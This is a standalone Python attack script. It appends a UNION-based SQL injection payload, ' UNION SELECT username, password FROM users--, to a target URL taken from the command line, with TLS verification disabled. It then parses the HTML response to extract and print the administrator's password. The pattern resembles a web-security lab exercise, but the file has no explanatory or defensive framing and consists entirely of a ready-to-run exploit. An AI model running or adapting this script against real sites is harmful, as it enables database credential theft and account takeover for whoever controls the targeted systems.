import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def union_attack(url):
    username = "administrator"
    sql_payload = "' UNION SELECT username, password FROM users--"
    try:
        r = requests.get(url + sql_payload, verify=False)
        r.raise_for_status()  # Raise an exception for 4xx/5xx status codes
        res = r.text
        if "administrator" in res:
            print('[+] Found "administrator" account.')
            soup = BeautifulSoup(r.text, "html.parser")
            admin_password = soup.body.find(string="administrator").parent.findNext("td").contents[0]
            print("[+] Password for \"administrator\" account is '%s'" % admin_password)
            return
        else:
            print("[-] Password not found.")
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        union_attack(url)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
